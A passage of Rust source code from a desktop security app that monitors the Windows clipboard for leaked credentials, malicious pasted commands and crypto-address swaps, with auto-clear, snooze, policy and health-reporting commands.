static RULE_LOOKUP: Lazy<Mutex<HashMap<RuleId, MatchedKind>>> =
    Lazy::new(|| Mutex::new(HashMap::new()));

/// Local custom names are safe to show in the local recent-detection ring;
/// no matcher text, captures, or clipboard content is retained here.
static LOCAL_CUSTOM_NAMES: Lazy<Mutex<HashMap<RuleId, String>>> =
    Lazy::new(|| Mutex::new(HashMap::new()));

/// Aggregate honest-health booleans (plan §4.2 Phase 1: "report that
/// honestly via capability status"). See this file's module doc and its
/// handoff note for the exact keys a later `capability_status` integration
/// should read.
static HEALTH: Lazy<Mutex<HelperHealth>> = Lazy::new(|| Mutex::new(HelperHealth::default()));

/// The stop flag handed to `listener::start` for the CURRENTLY running
/// watcher instance, if any. `stop_paste_monitor` flips it so the polling
/// fallback (`SequencePoller`) notices within one fallback tick; see
/// `stop_paste_monitor`'s doc for the event-driven listener's own,
/// different (and documented) stop-latency behaviour.
static LISTENER_STOP: Lazy<Mutex<Option<Arc<AtomicBool>>>> = Lazy::new(|| Mutex::new(None));

/// SHA-256 of the last clipboard text this file actually processed.
/// Shared (rather than a local variable) because BOTH the clipboard-
/// change-driven task and the housekeeping task's own clipboard writes
/// (auto-clear on detection, auto-clear on lock) need to update it, exactly
/// mirroring the old single-loop design where both concerns shared one
/// local `last_hash`.
static LAST_HASH: Lazy<Mutex<Option<[u8; 32]>>> = Lazy::new(|| Mutex::new(None));

// ── Auto-clear sensitive content (paid extension) ───────────────────
//
// After a detection fires, schedule the clipboard to be erased N seconds
// later. Only erases if the clipboard content hasn't changed in the
// meantime — i.e. the user didn't deliberately copy something else.
// Defends against the "I copied a private key and forgot it was still
// on the clipboard" leak vector.

static AUTO_CLEAR_ENABLED: AtomicBool = AtomicBool::new(false);
/// Seconds after detection to clear the clipboard. Default 30 s.
static AUTO_CLEAR_SECONDS: AtomicU32 = AtomicU32::new(30);

/// Clear the clipboard the moment the workstation locks (free-tier
/// "clipboard firewall"). Fires on the unlocked→locked transition only —
/// not on every tick while the station is already locked.
static AUTO_CLEAR_ON_LOCK: AtomicBool = AtomicBool::new(false);

/// `Some((deadline, hash_at_detection))` while an auto-clear is pending.
/// The housekeeping task checks this every tick — if the deadline has
/// passed AND the current clipboard hash still matches, it clears the
/// clipboard.
#[allow(clippy::type_complexity)]
static PENDING_CLEAR: Lazy<Mutex<Option<(Instant, [u8; 32])>>> = Lazy::new(|| Mutex::new(None));

fn clear_clipboard() -> bool {
    // Setting an empty Unicode string is the cross-app-compat way to
    // "clear" — `clipboard_win::empty()` works too but some apps poll
    // the clipboard expecting SOME format to be present.
    clipboard_win::set_clipboard_string("").is_ok()
}

/// Pure health-bookkeeping decision for one clear attempt: never claim a
/// failed erase succeeded (plan §9 exit criterion: "clear/quarantine
/// outcome is verified and reported as success/failure only"). This backs
/// BOTH of this file's own clipboard-erasing call sites (auto-clear on
/// detection, auto-clear on workstation lock) — neither is a
/// `wincmd_clip_rules::Action::ClearClipboard` requested BY a matched rule
/// (this file's own free-tier rules never request that action; see the
/// module doc), but the same "never lie about a failed clear" invariant
/// applies regardless of which mechanism triggered the attempt.
fn clear_health_after_attempt(cleared_ok: bool) -> bool {
    !cleared_ok
}

// ── Workstation-lock probe ──────────────────────────────────────────
//
// KT: WTS_SESSIONSTATE_LOCK == 0 on Win8+. On Win7 the value was
// inverted (0 = unlocked, 1 = locked). WinCommander targets Win11 so
// the Win8+ convention is assumed throughout; behaviour should be
// confirmed on a live Win11 machine by locking (Win+L) and watching
// for the "[PasteMonitor] auto-clear on lock" log line.
// SessionFlags is signed i32 in windows-sys but the API documents it
// as a DWORD (u32) bitmask; the cast to u32 before comparison is
// deliberate: WTS_SESSIONSTATE_LOCK == 0u32.

#[cfg(windows)]
fn workstation_is_locked() -> Option<bool> {
    use windows_sys::Win32::Foundation::HANDLE;
    use windows_sys::Win32::System::RemoteDesktop::{
        WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, WTS_SESSIONSTATE_LOCK, WTSFreeMemory,
        WTSINFOEXW, WTSQuerySessionInformationW, WTSSessionInfoEx,
    };

    let mut pp_buffer: *mut u16 = std::ptr::null_mut();
    let mut bytes: u32 = 0;
    // SAFETY: WTS_CURRENT_SERVER_HANDLE is a sentinel (null) value defined
    // by windows-sys that tells the API to query the local server.
    // pp_buffer receives a wtsapi32-allocated WTSINFOEXW; we cast the
    // pointer after a successful call and read only Level/Data.
    let ok = unsafe {
        WTSQuerySessionInformationW(
            WTS_CURRENT_SERVER_HANDLE as HANDLE,
            WTS_CURRENT_SESSION,
            WTSSessionInfoEx,
            &mut pp_buffer,
            &mut bytes,
        )
    };
    if ok == 0 || pp_buffer.is_null() {
        return None;
    }
    // SAFETY: on success pp_buffer points to a valid WTSINFOEXW allocated
    // by wtsapi32. We read it before calling WTSFreeMemory.
    let info = unsafe { &*(pp_buffer as *const WTSINFOEXW) };
    let session_flags = unsafe { info.Data.WTSInfoExLevel1.SessionFlags };
    unsafe { WTSFreeMemory(pp_buffer as *mut core::ffi::c_void) };
    Some(session_flags as u32 == WTS_SESSIONSTATE_LOCK)
}

#[cfg(not(windows))]
fn workstation_is_locked() -> Option<bool> {
    None
}

/// Build a pending-clear entry from the detection instant: the deadline is
/// `at + max(secs, 1)s` (never zero — that would race the user's own paste)
/// and the hash is the detection-time clipboard hash. Mirrors the inline
/// scheduling in the poll loop so the deadline maths is unit-testable.
fn schedule_clear(at: Instant, secs: u64, hash: [u8; 32]) -> (Instant, [u8; 32]) {
    (at + Duration::from_secs(secs.max(1)), hash)
}

/// Pure auto-clear decision: given a pending `(deadline, hash_at_detection)`
/// entry, the current instant, and the *current* clipboard hash (if any),
/// return whether the erase should fire now. Fires only when the deadline
/// has passed AND the clipboard still holds the exact payload that was
/// flagged (hash match) — so a deliberate re-copy (different hash) or a
/// non-text copy (`None`) cancels the erase. Mirrors the poll-loop logic so
/// the timing/hash-guard is deterministically testable.
fn should_auto_clear(
    pending: (Instant, [u8; 32]),
    now: Instant,
    current_hash: Option<[u8; 32]>,
) -> bool {
    let (deadline, expected_hash) = pending;
    if now < deadline {
        return false;
    }
    matches!(current_hash, Some(h) if h == expected_hash)
}

/// Last 10 detections (in-memory, ring buffer). No clipboard content;
/// pattern name + timestamp only.
const RECENT_CAP: usize = 10;
static RECENT: Lazy<Mutex<VecDeque<DetectionEvent>>> =
    Lazy::new(|| Mutex::new(VecDeque::with_capacity(RECENT_CAP)));

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct DetectionEvent {
    pub pattern: String,
    /// "warning" for credential-leak patterns; "danger" for
    /// malicious-command patterns (ClickFix / pastejacking). Frontend
    /// uses this to differentiate toast copy + colour.
    pub severity: String,
    pub detected_at: String,
}

/// Content-free reports queued for the check-in path (plan §4.2 item 5).
/// Bounded so a long-running session can't grow this unboundedly; a
/// future check-in integrator (`commander-pro` — a later workflow) should
/// use `drain_paste_monitor_pending_reports` to actually flush these
/// toward `CheckinBody.clipboard_events`.
const PENDING_REPORTS_CAP: usize = 20;
static PENDING_REPORTS: Lazy<Mutex<VecDeque<ClipboardEventReport>>> =
    Lazy::new(|| Mutex::new(VecDeque::with_capacity(PENDING_REPORTS_CAP)));

// ── Helpers ─────────────────────────────────────────────────────────

fn hash_text(s: &str) -> [u8; 32] {
    let mut h = Sha256::new();
    h.update(s.as_bytes());
    h.finalize().into()
}

/// Returns true if currently snoozed; clears expired snooze in passing.
fn is_snoozed() -> bool {
    let mut guard = SNOOZE_UNTIL.lock().unwrap();
    match *guard {
        Some(until) => {
            if Instant::now() >= until {
                *guard = None;
                false
            } else {
                true
            }
        }
        None => false,
    }
}

fn push_recent(ev: DetectionEvent) {
    let mut q = RECENT.lock().unwrap();
    if q.len() == RECENT_CAP {
        q.pop_front();
    }
    q.push_back(ev);
}

fn push_pending_report(report: ClipboardEventReport) {
    let mut q = PENDING_REPORTS.lock().unwrap();
    if q.len() == PENDING_REPORTS_CAP {
        q.pop_front();
    }
    q.push_back(report);
}

/// Build the content-free wire report for one emitted match — pulled out
/// of `handle_emit` so the content-free guarantee is directly testable
/// without an `AppHandle`/native notification (see the sentinel test
/// below). Mirrors `clipboard_guard_helper::report::build_report`'s own
/// doc: called with an `ActionOutcome` reflecting only the LOCAL action
/// (`NotifyUser`) actually attempted so far — `ReportFleet` is never
/// marked as attempted in the report that IS the attempt (a message can't
/// truthfully assert its own successful delivery before delivery
/// happens).
fn build_pending_report(
    policy_version: i64,
    verdict: &Verdict,
    notified_ok: bool,
    suppressed_since_last: u32,
) -> ClipboardEventReport {
    let outcome = ActionOutcome {
        attempted: vec![Action::NotifyUser],
        succeeded: if notified_ok {
            vec![Action::NotifyUser]
        } else {
            Vec::new()
        },
    };
    build_report(
        policy_version,
        &verdict.rule_id,
        verdict.rule_revision,
        verdict.severity,
        &outcome,
        suppressed_since_last,
    )
}

fn build_pending_report_with_outcome(
    policy_version: i64,
    verdict: &Verdict,
    outcome: &ActionOutcome,
    suppressed_since_last: u32,
) -> ClipboardEventReport {
    build_report(
        policy_version,
        &verdict.rule_id,
        verdict.rule_revision,
        verdict.severity,
        outcome,
        suppressed_since_last,
    )
}

fn fleet_action_outcome(outcome: &ActionOutcome, verdict: &Verdict) -> ActionOutcome {
    ActionOutcome {
        attempted: outcome
            .attempted
            .iter()
            .copied()
            .filter(|action| verdict.actions.contains(action))
            .collect(),
        succeeded: outcome
            .succeeded
            .iter()
            .copied()
            .filter(|action| verdict.actions.contains(action))
            .collect(),
    }
}

/// Handle one `MatchOutcome::Emit` — the toast/`DetectionEvent`/log
/// exactly matches the legacy engine's copy and behaviour (see
/// `detection_copy`); the report-building/queuing and best-effort svc
/// submission are new (plan §4.2 items 5/6).
///
/// **Honest caveat on the svc submission**: `svc.clipboard.report_event`
/// is a `SessionHelper`-class verb (GROUNDING §7, D-2). As of this file's
/// writing, `commander-svc/src/pipe.rs` does not yet unwrap `Envelope::
/// Signed` request frames and its `SessionHelper` authorization gate is
/// still fail-closed pending the D-2 peer-pinning wiring (see
/// `clipboard-guard-helper`'s own handoff note, which documents the exact
/// same gap for its standalone client) — this file did not, and by file
/// ownership could not, fix that in `pipe.rs`. The call below degrades
/// gracefully either way (`SvcClient` never panics or hangs — see its own
/// module doc) and `HEALTH.svc_reachable` reports the true outcome; the
/// queued `PENDING_REPORTS` ring is this file's OWN durable-enough record
/// of what was detected regardless of whether the live call succeeds.
fn handle_combined_emit(
    app: &AppHandle,
    fleet_policy_version: i64,
    combined: CombinedVerdict,
    clipboard_hash: [u8; 32],
) {
    let pattern = combined
        .matches
        .iter()
        .find_map(|matched| {
            if matched.source != PolicySource::Local {
                return None;
            }
            if let Some(kind) = RULE_LOOKUP
                .lock()
                .unwrap()
                .get(&matched.verdict.rule_id)
                .copied()
            {
                return Some(kind.display_name().to_string());
            }
            LOCAL_CUSTOM_NAMES
                .lock()
                .unwrap()
                .get(&matched.verdict.rule_id)
                .cloned()
        })
        .unwrap_or_else(|| "Organization clipboard rule".to_string());
    let severity = severity_label(combined.severity);

    let payload = DetectionEvent {
        pattern: pattern.clone(),
        severity: severity.to_string(),
        detected_at: chrono::Utc::now().to_rfc3339(),
    };
    let _ = app.emit("paste-monitor-detected", &payload);

    // Schedule auto-clear if enabled — same trigger/timing as before.
    if AUTO_CLEAR_ENABLED.load(Ordering::SeqCst) {
        let secs = AUTO_CLEAR_SECONDS.load(Ordering::SeqCst) as u64;
        *PENDING_CLEAR.lock().unwrap() = Some(schedule_clear(Instant::now(), secs, clipboard_hash));
    }

    let mut outcome = ActionOutcome::new();
    let mut writer = Win32Writer::default();
    for action in &combined.actions {
        match action {
            Action::NotifyUser => {
                let (title, body) = detection_copy(&pattern, severity);
                let ok = crate::native_notify::show_native_notification(app, title, &body).is_ok();
                outcome.attempted.push(*action);
                if ok {
                    outcome.succeeded.push(*action);
                }
            }
            Action::ClearClipboard => {
                outcome.attempted.push(*action);
                if writer.clear() {
                    outcome.succeeded.push(*action);
                }
            }
            Action::QuarantineClipboard => {
                outcome.attempted.push(*action);
                if writer.quarantine("[Clipboard Guard quarantined this content]") {
                    outcome.succeeded.push(*action);
                }
            }
            // These actions are fulfilled only by the subsequent Fleet
            // submission, and local policy validation rejects them.
            Action::RecordLocalReceipt | Action::ReportFleet | Action::AlertAdmin => {}
        }
    }

    push_recent(payload);
    crate::log_message(
        "info",
        &format!("[PasteMonitor] detected ({}): {}", severity, pattern),
    );

    // A local match never enters this loop. Fleet rules are the sole
    // authority allowed to create a content-free Fleet event.
    for matched in combined
        .matches
        .iter()
        .filter(|matched| matched.source == PolicySource::Fleet)
        .filter(|matched| matched.verdict.actions.contains(&Action::ReportFleet))
    {
        let fleet_outcome = fleet_action_outcome(&outcome, &matched.verdict);
        let report = build_pending_report_with_outcome(
            fleet_policy_version,
            &matched.verdict,
            &fleet_outcome,
            matched.suppressed_since_last,
        );
        push_pending_report(report.clone());
        tauri::async_runtime::spawn(async move {
            let ok = SvcClient::new().report_event(&report).await.is_ok();
            HEALTH.lock().unwrap().svc_reachable = ok;
        });
    }
}

// ── Tauri command surface ───────────────────────────────────────────

#[tauri::command]
pub async fn start_paste_monitor(app: AppHandle) -> Result<(), String> {
    if RUNNING.swap(true, Ordering::SeqCst) {
        return Ok(()); // already running, idempotent
    }
    let generation = GENERATION.fetch_add(1, Ordering::SeqCst) + 1;
    crate::log_message("debug", "[PasteMonitor] watcher started");

    {
        let enabled = *ENABLED_CATEGORIES.lock().unwrap();
        let _ = install_free_tier_policy(&enabled);
    }
    tauri::async_runtime::spawn(async {
        // Failure retains the last good Fleet source; the next monitor
        // start or Fleet refresh can retry without weakening protection.
        let _ = refresh_managed_clipboard_guard_rules().await;
    });

    let mut health = *HEALTH.lock().unwrap();
    health.helper_running = true;

    // Event-driven listener, falling back to a slow sequence-number poll
    // if `AddClipboardFormatListener` registration fails — never silently
    // (plan §4.2): `listener::start` writes `health.listener_registered`
    // honestly either way.
    let stop = Arc::new(AtomicBool::new(false));
    let (change_source, mode) =
        listener::start(Duration::from_millis(2000), stop.clone(), &mut health);
    crate::log_message("info", &format!("[PasteMonitor] listener mode: {:?}", mode));

    *HEALTH.lock().unwrap() = health;
    *LISTENER_STOP.lock().unwrap() = Some(stop);

    // ── Task A: housekeeping — auto-clear-on-lock + pending-clear
    //    deadline, independent of clipboard-change events (a lock or a
    //    deadline can happen with no new clipboard content at all). Ticks
    //    every 2s, matching the legacy combined loop's cadence.
    {
        let my_generation = generation;
        tauri::async_runtime::spawn(async move {
            let mut interval = tokio::time::interval(Duration::from_millis(2000));
            interval.tick().await; // discard first immediate tick
            let mut was_locked = false;
            let mut lock_text_source = Win32TextSource::default();

            loop {
                interval.tick().await;
                if GENERATION.load(Ordering::SeqCst) != my_generation
                    || !RUNNING.load(Ordering::SeqCst)
                {
                    break;
                }

                // Auto-clear on lock: fires only on the unlocked→locked
                // transition so a station that was already locked at
                // startup does not trigger a spurious clear.
                if let Some(locked) = workstation_is_locked() {
                    if locked && !was_locked && AUTO_CLEAR_ON_LOCK.load(Ordering::SeqCst) {
                        let cleared = clear_clipboard();
                        HEALTH.lock().unwrap().clear_failing = clear_health_after_attempt(cleared);
                        if cleared {
                            crate::log_message(
                                "info",
                                "[PasteMonitor] auto-clear on lock — clipboard erased",
                            );
                            *LAST_HASH.lock().unwrap() = Some(hash_text(""));
                        }
                    }
                    was_locked = locked;
                }

                // Pending auto-clear: erase only if the deadline has
                // passed AND the content hasn't changed since detection.
                // Runs even while snoozed — snooze suppresses DETECTION,
                // not the protective erase of an already-detected payload.
                let pending = *PENDING_CLEAR.lock().unwrap();
                if let Some(pending) = pending {
                    if Instant::now() >= pending.0 {
                        let current_hash = match lock_text_source.read_text() {
                            ReadOutcome::Text(t) => Some(hash_text(&t)),
                            ReadOutcome::NoText | ReadOutcome::Failed => None,
                        };
                        if should_auto_clear(pending, Instant::now(), current_hash) {
                            let cleared = clear_clipboard();
                            HEALTH.lock().unwrap().clear_failing =
                                clear_health_after_attempt(cleared);
                            if cleared {
                                crate::log_message(
                                    "info",
                                    "[PasteMonitor] auto-clear fired — clipboard erased",
                                );
                                *LAST_HASH.lock().unwrap() = Some(hash_text(""));
                            }
                        }
                        *PENDING_CLEAR.lock().unwrap() = None;
                    }
                }
            }
        });
    }

    // ── Task B: clipboard-change-driven detection.
    {
        let app = app.clone();
        let my_generation = generation;
        tauri::async_runtime::spawn(async move {
            let mut change_source = change_source;
            let mut text_source = Win32TextSource::default();
            let mut engine = MatchEngine::new();

            loop {
                if GENERATION.load(Ordering::SeqCst) != my_generation
                    || !RUNNING.load(Ordering::SeqCst)
                {
                    break;
                }

                // `wait_for_change` blocks (possibly indefinitely, for the
                // real event-driven listener) — run it on a blocking-pool
                // thread rather than the async worker, per `listener::
                // ClipboardChangeSource`'s own contract. `change_source`
                // is moved in and back out because it (and the real
                // `Win32EventListener` it may wrap) isn't `Sync`-shareable
                // across an `.await` any other way.
                let joined = tokio::task::spawn_blocking(move || {
                    let changed = change_source.wait_for_change();
                    (change_source, changed)
                })
                .await;
                let (returned_source, changed) = match joined {
                    Ok(v) => v,
                    Err(_) => break, // blocking task panicked — stop, don't spin
                };
                change_source = returned_source;
                if !changed {
                    // The change source itself was asked to stop.
                    break;
                }
                if GENERATION.load(Ordering::SeqCst) != my_generation
                    || !RUNNING.load(Ordering::SeqCst)
                {
                    break;
                }

                if is_snoozed() {
                    continue;
                }

                let text = match text_source.read_text() {
                    ReadOutcome::Text(t) => t,
                    ReadOutcome::NoText => continue,
                    ReadOutcome::Failed => {
                        crate::log_message(
                            "warn",
                            "[PasteMonitor] clipboard read failed after retries",
                        );
                        continue;
                    }
                };

                let h = hash_text(&text);
                let is_dup = {
                    let mut last = LAST_HASH.lock().unwrap();
                    if *last == Some(h) {
                        true
                    } else {
                        *last = Some(h);
                        false
                    }
                };
                if is_dup {
                    continue;
                }

                // ── Crypto-swap detection (unchanged; runs BEFORE
                //    category pattern matching so a hijack signature isn't
                //    masked by an unrelated secret landing on the
                //    clipboard at the same time).
                let swap_hit: Option<CryptoFamily> = if CRYPTO_SWAP_ENABLED.load(Ordering::SeqCst) {
                    let current = extract_crypto_addresses(&text);
                    let mut last_map = LAST_CRYPTO_ADDR.lock().unwrap();
                    decide_crypto_swap(&current, &mut last_map, Instant::now())
                } else {
                    None
                };

                if let Some(family) = swap_hit {
                    let pattern = format!("Crypto Address Swap ({})", family.display());
                    let payload = DetectionEvent {
                        pattern: pattern.clone(),
                        severity: "danger".to_string(),
                        detected_at: chrono::Utc::now().to_rfc3339(),
                    };
                    let _ = app.emit("paste-monitor-detected", &payload);
                    let body = format!(
                        "Your clipboard's {} address just changed to a different one without you copying it. \
                            Clipboard-hijack malware is the most likely cause. DO NOT send — verify the address character-by-character.",
                        family.display()
                    );
                    if let Err(e) = crate::native_notify::show_native_notification(
                        &app,
                        "WinCommander - Crypto address swap",
                        &body,
                    ) {
                        crate::log_message(
                            "warn",
                            &format!("[PasteMonitor] notification failed: {}", e),
                        );
                    }
                    push_recent(payload);
                    crate::log_message(
                        "info",
                        &format!("[PasteMonitor] crypto-swap detected: {}", family.display()),
                    );

                    if AUTO_CLEAR_ENABLED.load(Ordering::SeqCst) {
                        let secs = AUTO_CLEAR_SECONDS.load(Ordering::SeqCst) as u64;
                        *PENDING_CLEAR.lock().unwrap() =
                            Some(schedule_clear(Instant::now(), secs, h));
                    }

                    // Don't ALSO run category matching — the swap is the
                    // primary signal.
                    continue;
                }

                // ── Builtin/structured category matching via
                //    wincmd_clip_rules, gated by the same `< 13 bytes`
                //    floor the legacy engine used (kept for byte-for-byte
                //    parity, including its one quirk: a match under 13
                //    bytes never fires, even a unicode-anomaly one).
                if text.len() >= 13 {
                    let (outcome, fleet_policy_version) = {
                        let policy = POLICY.lock().unwrap();
                        let fleet_policy_version = policy.fleet().policy_version;
                        (
                            engine.observe_sources(&policy, &text, Instant::now()),
                            fleet_policy_version,
                        )
                    };
                    match outcome {
                        CombinedMatchOutcome::NoMatch => {}
                        CombinedMatchOutcome::Suppressed { .. } => {
                            // Folded into the next Emit's
                            // `suppressed_since_last` — no toast, no
                            // report, per plan §4.2/§4.4: a repeated match
                            // becomes a count, not an alert storm.
                        }
                        CombinedMatchOutcome::Emit { verdict } => {
                            handle_combined_emit(&app, fleet_policy_version, verdict, h);
                        }
                    }
                }
            }

            HEALTH.lock().unwrap().helper_running = false;
            crate::log_message("debug", "[PasteMonitor] watcher stopped");
        });
    }

    Ok(())
}

/// Stop the watcher. This is a SOFT stop, same as the legacy engine's own
/// (which took up to one 2s poll tick to notice): the polling fallback
/// (`SequencePoller`) notices within one fallback tick because its `stop`
/// flag is checked inside its own sleep loop. The real event-driven
/// listener has no such internal check — `Win32EventListener::
/// wait_for_change` just blocks on a channel recv — so when it's actually
/// registered, teardown only happens the NEXT time a real clipboard change
/// wakes the blocking call (which then sees `RUNNING == false` and drops
/// the listener, running its `Drop` — `RemoveClipboardFormatListener` +
/// thread join). In practice this is rarely noticeable (interactive
/// desktops see clipboard activity often), and `RUNNING`/`GENERATION`
/// checks mean a not-yet-torn-down instance does nothing observable in the
/// meantime; this is a documented, accepted limitation of reusing
/// `clipboard_guard_helper::listener`'s blocking `ClipboardChangeSource`
/// API (see that crate's own `bin/main.rs`, which has the identical gap
/// and says so).
#[tauri::command]
pub async fn stop_paste_monitor() -> Result<(), String> {
    RUNNING.store(false, Ordering::SeqCst);
    if let Some(stop) = LISTENER_STOP.lock().unwrap().take() {
        stop.store(true, Ordering::SeqCst);
    }
    Ok(())
}

#[tauri::command]
pub async fn paste_monitor_status() -> Result<bool, String> {
    Ok(RUNNING.load(Ordering::SeqCst))
}

/// Update which pattern categories the watcher fires for. Frontend calls
/// this on app boot (after settings load) and on every category toggle.
/// Settings.json is the persistent layer; this mutex is the runtime
/// authority that the watcher reads from. Recompiles the free-tier
/// `wincmd_clip_rules` ruleset immediately (see `install_free_tier_policy`)
/// so a toggle takes effect on the very next clipboard change.
#[tauri::command]
pub async fn set_paste_monitor_categories(categories: EnabledCategories) -> Result<(), String> {
    *ENABLED_CATEGORIES.lock().unwrap() = categories;
    install_free_tier_policy(&categories)
}

#[tauri::command]
pub async fn get_paste_monitor_categories() -> Result<EnabledCategories, String> {
    Ok(*ENABLED_CATEGORIES.lock().unwrap())
}

fn local_actions_are_safe(policy: &ClipboardPolicyResponse) -> bool {
    policy.rules.iter().all(|rule| {
        !rule.locked
            && rule.actions.iter().all(|action| {
                matches!(
                    action,
                    Action::NotifyUser | Action::ClearClipboard | Action::QuarantineClipboard
                )
            })
    })
}

fn rules_have_cross_source_collision(
    local: &ClipboardPolicyResponse,
    fleet: &ClipboardPolicyResponse,
) -> bool {
    local.rules.iter().any(|local_rule| {
        fleet
            .rules
            .iter()
            .any(|fleet_rule| fleet_rule.id == local_rule.id)
    })
}

/// Replace the user-owned custom portion of the local source. The caller
/// persists this value through settings; this command only validates and
/// atomically activates it alongside the immutable builtins.
#[tauri::command]
pub async fn set_local_clipboard_guard_rules(
    policy: ClipboardPolicyResponse,
) -> Result<(), String> {
    if !local_actions_are_safe(&policy) {
        return Err("local clipboard rules may only notify, clear, or quarantine".to_string());
    }
    let enabled = *ENABLED_CATEGORIES.lock().unwrap();
    let (candidate, _) = local_policy_response(&enabled, &policy);
    let fleet = MANAGED_FLEET_RULES.lock().unwrap().clone();
    if rules_have_cross_source_collision(&candidate, &fleet) {
        return Err("local clipboard rules reuse a managed rule identifier".to_string());
    }
    install_local_policy(&enabled, &policy)?;
    *LOCAL_CUSTOM_NAMES.lock().unwrap() = policy
        .rules
        .iter()
        .map(|rule| (rule.id.clone(), rule.name.clone()))
        .collect();
    *LOCAL_CUSTOM_RULES.lock().unwrap() = policy;
    Ok(())
}

#[tauri::command]
pub async fn get_local_clipboard_guard_rules() -> Result<ClipboardPolicyResponse, String> {
    Ok(LOCAL_CUSTOM_RULES.lock().unwrap().clone())
}

/// Fetch and atomically install a verified policy from commander-svc. A
/// failed fetch deliberately retains the last valid Fleet source.
pub async fn refresh_managed_clipboard_guard_rules() -> Result<(), String> {
    let response = SvcClient::new()
        .get_policy()
        .await
        .map_err(|_| "managed clipboard policy is unavailable".to_string())?;
    let enabled = *ENABLED_CATEGORIES.lock().unwrap();
    let custom = LOCAL_CUSTOM_RULES.lock().unwrap().clone();
    let (local, _) = local_policy_response(&enabled, &custom);
    if rules_have_cross_source_collision(&local, &response) {
        return Err("managed clipboard policy reuses a local rule identifier".to_string());
    }
    POLICY
        .lock()
        .unwrap()
        .install_fleet(&response)
        .map_err(|_| "managed clipboard policy was rejected".to_string())?;
    *MANAGED_FLEET_RULES.lock().unwrap() = response;
    Ok(())
}

#[tauri::command]
pub async fn get_managed_clipboard_guard_rules() -> Result<ClipboardPolicyResponse, String> {
    Ok(MANAGED_FLEET_RULES.lock().unwrap().clone())
}

/// Called by Fleet only after an approved successful unenrolment. It never
/// clears the user's builtins or custom rules.
pub fn clear_paste_monitor_fleet_policy_on_unenroll() {
    POLICY.lock().unwrap().clear_fleet_on_unenroll();
    *MANAGED_FLEET_RULES.lock().unwrap() = ClipboardPolicyResponse {
        policy_version: 0,
        rules: Vec::new(),
    };
}

/// Mute the watcher for N minutes. While snoozed the loop still runs
/// (so the toggle stays visibly "on"), but skips clipboard reads + match
/// dispatch entirely. Re-snoozing replaces any prior deadline.
#[tauri::command]
pub async fn snooze_paste_monitor(minutes: u32) -> Result<(), String> {
    if minutes == 0 {
        *SNOOZE_UNTIL.lock().unwrap() = None;
        return Ok(());
    }
    let until = Instant::now() + Duration::from_secs(minutes as u64 * 60);
    *SNOOZE_UNTIL.lock().unwrap() = Some(until);
    crate::log_message(
        "info",
        &format!("[PasteMonitor] snoozed for {} min", minutes),
    );
    Ok(())
}

/// Returns seconds remaining on the current snooze, or 0 if not snoozed.
/// Auto-clears expired snooze (matches `is_snoozed`).
#[tauri::command]
pub async fn paste_monitor_snooze_remaining() -> Result<u64, String> {
    let mut guard = SNOOZE_UNTIL.lock().unwrap();
    match *guard {
        Some(until) => {
            let now = Instant::now();
            if now >= until {
                *guard = None;
                Ok(0)
            } else {
                Ok((until - now).as_secs())
            }
        }
        None => Ok(0),
    }
}

#[tauri::command]
pub async fn cancel_paste_monitor_snooze() -> Result<(), String> {
    *SNOOZE_UNTIL.lock().unwrap() = None;
    Ok(())
}

/// Last N detections (oldest first). In-memory only; cleared on app exit.
#[tauri::command]
pub async fn get_paste_monitor_recent() -> Result<Vec<DetectionEvent>, String> {
    Ok(RECENT.lock().unwrap().iter().cloned().collect())
}

#[tauri::command]
pub async fn clear_paste_monitor_recent() -> Result<(), String> {
    RECENT.lock().unwrap().clear();
    Ok(())
}

/// Honest health snapshot (plan §4.2 Phase 1): `listener_registered`,
/// `rules_compiled`, `policy_current`, `clear_failing`, plus this file's
/// own `helper_running`/`svc_reachable`. See the module doc / this file's
/// handoff note for exact semantics a `capability_status` integration
/// should rely on.
#[tauri::command]
pub async fn get_paste_monitor_health() -> Result<HelperHealth, String> {
    Ok(*HEALTH.lock().unwrap())
}

/// Non-destructive peek at the queued content-free reports (e.g. for a
/// settings-panel debug view). See `drain_paste_monitor_pending_reports`
/// for the call a check-in integrator should actually use to flush them.
#[tauri::command]
pub async fn get_paste_monitor_pending_reports() -> Result<Vec<ClipboardEventReport>, String> {
    Ok(PENDING_REPORTS.lock().unwrap().iter().cloned().collect())
}

/// Atomically return and clear every queued content-free report (plan
/// §4.2 item 5: "queue a content-free report for the check-in path"). A
/// future check-in integrator (`commander-pro` — a later workflow) should
/// use this to flush events toward `CheckinBody.clipboard_events`.
#[tauri::command]
pub async fn drain_paste_monitor_pending_reports() -> Result<Vec<ClipboardEventReport>, String> {
    let mut q = PENDING_REPORTS.lock().unwrap();
    Ok(q.drain(..).collect())
}

// ── Crypto-swap toggle (paid) ───────────────────────────────────────

#[tauri::command]
pub async fn set_paste_monitor_crypto_swap(enabled: bool) -> Result<(), String> {
    crate::license::require_paid("clipboard crypto-swap guard")?;
    CRYPTO_SWAP_ENABLED.store(enabled, Ordering::SeqCst);
    if !enabled {
        // Clearing the per-family last-seen map on disable means a later
        // re-enable starts from a clean slate — avoids a stale entry from
        // pre-disable firing a swap immediately on re-enable.
        LAST_CRYPTO_ADDR.lock().unwrap().clear();
    }
    Ok(())
}

#[tauri::command]
pub async fn get_paste_monitor_crypto_swap() -> Result<bool, String> {
    Ok(CRYPTO_SWAP_ENABLED.load(Ordering::SeqCst))
}

// ── Auto-clear sensitive clipboard (paid) ───────────────────────────

#[derive(Debug, Serialize, Deserialize, Clone, Copy)]
#[serde(rename_all = "camelCase")]
pub struct AutoClearConfig {
    pub enabled: bool,
    pub seconds: u32,
}

#[tauri::command]
pub async fn set_paste_monitor_auto_clear(enabled: bool, seconds: u32) -> Result<(), String> {
    crate::license::require_paid("clipboard auto-clear")?;
    // Clamp to a sane window — 5 s minimum (anything below races the
    // user's own paste action), 600 s maximum (10 min is plenty).
    let secs = seconds.clamp(5, 600);
    AUTO_CLEAR_ENABLED.store(enabled, Ordering::SeqCst);
    AUTO_CLEAR_SECONDS.store(secs, Ordering::SeqCst);
    if !enabled {
        // Cancel any in-flight clear when the user turns it off.
        *PENDING_CLEAR.lock().unwrap() = None;
    }
    Ok(())
}

#[tauri::command]
pub async fn get_paste_monitor_auto_clear() -> Result<AutoClearConfig, String> {
    Ok(AutoClearConfig {
        enabled: AUTO_CLEAR_ENABLED.load(Ordering::SeqCst),
        seconds: AUTO_CLEAR_SECONDS.load(Ordering::SeqCst),
    })
}

// ── Auto-clear on workstation lock (free-tier clipboard firewall) ───

#[tauri::command]
pub async fn set_paste_monitor_auto_clear_on_lock(enabled: bool) -> Result<(), String> {
